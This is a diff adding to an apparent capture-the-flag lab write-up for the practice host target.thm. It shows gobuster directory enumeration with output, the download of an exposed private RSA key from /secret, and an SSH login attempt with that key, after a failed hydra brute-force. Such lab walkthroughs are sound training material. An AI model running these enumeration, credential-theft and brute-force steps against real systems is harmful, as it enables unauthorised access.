@@ -109,3 +109,43 @@ $ hydra -l john -P dict.lst target.thm ssh
 ```
 
 That yield nothing.
+
+I ran gobuster to find more directories on the server. Here is the command I ran:
+
+```bash
+$ gobuster dir -u http://target.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://target.thm
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/uploads              (Status: 301) [Size: 310] [--> http://target.thm/uploads/]
+/secret               (Status: 301) [Size: 309]
+```
+
+The /secret directory has a single file called secretKey. It is a private rsa key. I download it using the following command:
+
+```bash
+$ wget http://target.thm/secret/secretKey
+```
+
+Since this is a private rsa key I change the permission to private read/write so I won't get a warning each time I use this. Here is the command I used to fix the permissions:
+
+```bash
+$ chmod 600 secretKey
+```
+
+I try to ssh into the machine with this key but it wants a passphrase for the key. Here is what I used to ssh with the key:
+
+```bash
+$ ssh john@target.thm -i secretKey
+```
